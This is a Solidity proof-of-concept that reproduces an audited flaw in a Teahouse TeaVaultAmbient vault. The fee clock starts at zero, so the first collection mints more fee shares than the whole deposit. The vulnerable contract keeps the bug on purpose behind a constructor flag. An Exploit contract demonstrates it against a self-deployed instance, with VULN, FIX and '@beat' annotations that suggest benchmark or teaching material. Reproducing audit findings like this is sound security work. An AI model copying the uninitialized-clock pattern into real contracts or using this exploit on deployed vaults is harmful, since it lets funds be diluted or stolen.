// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Teahouse TeaVaultAmbient — first management fee (Zokyo, 2024-09-25)
    lastCollectManagementFee is left at its zero default instead of being set
    to the open timestamp. The first collection therefore accrues
    fee * block.timestamp, not fee * time-since-open. At a real unix time that
    mints more fee shares than the depositor's entire supply. The audited
    formula is preserved. The fix initializes the clock in the constructor.
*/

contract TeaVaultAmbient {
    uint256 internal constant FEE_MULTIPLIER = 1_000_000;
    uint256 internal constant SECONDS_IN_A_YEAR = 365 days;
    uint256 public constant DEPOSIT = 1000 ether;

    struct FeeConfig {
        uint256 managementFee; // 10000 = 1% with FEE_MULTIPLIER = 1e6, as the report's "10000 * td"
    }

    FeeConfig public feeConfig;
    uint256 public lastCollectManagementFee;
    uint256 public openedAt;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    string public symbol = "TEA";
    uint8 public constant decimals = 18;
    address public constant MANAGER = 0x1111111111111111111111111111111111111111;

    constructor(bool initClock) {
        feeConfig.managementFee = 10000;
        openedAt = block.timestamp;
        if (initClock) lastCollectManagementFee = block.timestamp;
    }

    function deposit() external {
        _mint(msg.sender, DEPOSIT); // @beat:deposit
    }

    function collect() external returns (uint256 collectedShares) {
        collectedShares = _collectManagementFee(); // @beat:collect
        if (collectedShares > 0) _mint(MANAGER, collectedShares);
        lastCollectManagementFee = block.timestamp;
    }

    function _collectManagementFee() internal view returns (uint256 collectedShares) {
        uint256 timeDiff = block.timestamp - lastCollectManagementFee; // @> VULN: lastCollect is 0, so timeDiff is the unix timestamp
        // FIX: initialize lastCollectManagementFee = block.timestamp when the vault opens.
        if (timeDiff > 0) {
            unchecked {
                uint256 feeTimesTimediff = feeConfig.managementFee * timeDiff; // @beat:product
                uint256 denominator = FEE_MULTIPLIER * SECONDS_IN_A_YEAR > feeTimesTimediff ? FEE_MULTIPLIER * SECONDS_IN_A_YEAR - feeTimesTimediff : 1; // @beat:den
                collectedShares = _mulDivUp(totalSupply, feeTimesTimediff, denominator);
            }
        }
    }

    function fairFee() public view returns (uint256) {
        uint256 timeDiff = block.timestamp - openedAt;
        if (timeDiff == 0) return 0;
        uint256 feeTimesTimediff = feeConfig.managementFee * timeDiff;
        uint256 denominator = FEE_MULTIPLIER * SECONDS_IN_A_YEAR - feeTimesTimediff;
        return _mulDivUp(totalSupply, feeTimesTimediff, denominator);
    }

    function _mint(address to, uint256 a) internal {
        balanceOf[to] += a;
        totalSupply += a;
    }

    function _mulDivUp(uint256 a, uint256 b, uint256 d) internal pure returns (uint256 r) {
        r = (a * b) / d;
        if ((a * b) % d > 0) r += 1;
    }
}

contract Exploit {
    TeaVaultAmbient public vault;
    uint256 public feeMinted;
    uint256 public fair;

    constructor() {
        vault = new TeaVaultAmbient(false); // nonce 1, clock left at 0
    }

    function run() external {
        require(block.timestamp > 365 days, "need a real unix time");
        vault.deposit();
        fair = vault.fairFee();
        feeMinted = vault.collect();
        require(fair == 0, "same-block fair fee is zero"); // @beat:fair
        require(feeMinted > 1000 ether, "fee exceeds the deposit");
        require(vault.balanceOf(address(0x1111111111111111111111111111111111111111)) == feeMinted, "manager received the fee shares");
    }
}
